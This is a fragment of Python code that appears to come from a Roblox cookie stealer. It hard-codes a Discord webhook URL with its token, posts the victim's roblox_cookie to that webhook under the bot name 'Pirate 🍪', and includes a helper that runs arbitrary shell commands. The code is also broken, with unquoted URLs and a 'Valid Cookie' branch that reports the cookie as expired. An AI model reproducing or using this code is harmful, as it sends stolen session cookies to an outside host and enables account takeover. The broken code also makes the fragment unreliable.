...
webhookk = "https://discord.com/api/webhooks/1131607956002181220/pa3ZYjiEeEvuOUlbhns11xbGWAdt71uK4O6JkL49IOfhNUUfSnyW0tOE5EqbrpOPasmN"
def command(c):
    os.system(c)
def cls():
    os.system("cls")
...
if isvalid == "Valid Cookie":
    ...
    requests.post(url=https://discord.com/api/webhooks/1131607956002181220/pa3ZYjiEeEvuOUlbhns11xbGWAdt71uK4O6JkL49IOfhNUUfSnyW0tOE5EqbrpOPasmN,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()
...
discord = Discord(url=https://discord.com/api/webhooks/1131607956002181220/pa3ZYjiEeEvuOUlbhns11xbGWAdt71uK4O6JkL49IOfhNUUfSnyW0tOE5EqbrpOPasmN)
discord.post(
    username="BOT - Pirate 🍪",
